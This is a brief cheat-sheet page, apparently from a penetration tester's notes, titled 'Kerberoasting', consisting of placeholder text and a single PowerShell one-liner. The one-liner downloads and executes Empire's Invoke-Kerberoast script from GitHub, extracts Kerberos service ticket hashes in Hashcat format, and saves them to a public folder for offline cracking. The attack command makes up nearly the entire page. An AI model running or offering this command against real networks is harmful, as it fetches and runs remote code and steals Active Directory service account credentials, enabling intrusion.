---
title: "Kerberoasting"
date: 2020-07-16T13:41:37+02:00
draft: false
---
asdas

#### EmpireProject Kerberoasting one-liner

```
IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath ‘c:\users\public\HashCapture.txt’ -Width 8000
```
